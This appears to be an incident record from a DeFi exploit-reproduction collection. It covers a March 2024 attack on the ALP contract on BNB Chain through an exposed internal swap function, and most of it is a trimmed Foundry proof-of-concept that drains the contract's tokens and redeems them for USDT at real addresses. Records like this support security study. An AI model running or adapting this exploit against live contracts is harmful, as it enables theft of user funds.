# [?] ALP - Public internal function

## Summary
Severity: Unknown
Chain: BNB Chain
Component: ALP
Published: 2024-03-06
Source: https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2024-03/ALP_exp.sol
Type: defi-exploit-poc

## Details
Lost: ~10K

```solidity
contract ContractTest is Test {
    IERC20 constant USDT = Alp(0x55d398326f99059fF775485246999027B3197955);
    Alp constant ALP_APO = Alp(0x9Ad45D46e2A2ca19BBB5D5a50Df319225aD60e0d);
    Vun constant VUN = Vun(0xD188492217F09D18f2B0ecE3F8948015981e961a);
    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);

    function setUp() external {
        cheats.createSelectFork("bsc", 36_727_073);
        deal(address(USDT), address(this), 0);
    }

    function testExploit() external {
        emit log_named_decimal_uint("[End] Attacker USDT before exploit", USDT.balanceOf(address(this)), 18);
        uint256 VUN_balance = ALP_APO.balanceOf(address(VUN));
        uint256[] memory pools = new uint256[](1);
        pools[0] = uint256(1_457_847_883_966_391_224_294_152_661_087_436_089_985_854_139_374_837_306_518); // translate into hex,contain your address
        VUN._swap(
            address(ALP_APO),
            abi.encodeWithSignature(
                "unoswapTo(address,address,uint256,uint256,uint256[])",
                address(this),
                address(ALP_APO),
                VUN_balance,
                0,
                pools
            )
        );
        ALP_APO.maxRedeem(address(this));
        ALP_APO.approve(address(ALP_APO), VUN_balance);
        RedeemData memory r;
        r.amount = VUN_balance;
        r.receiver = address(this);
        r.apolloXRedeemData.alpTokenOut = address(USDT);
        r.apolloXRedeemData.minOut = 0;
        r.apolloXRedeemData.tokenOut = address(USDT);
```

_Trimmed to 38 lines — full report: https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2024-03/ALP_exp.sol_
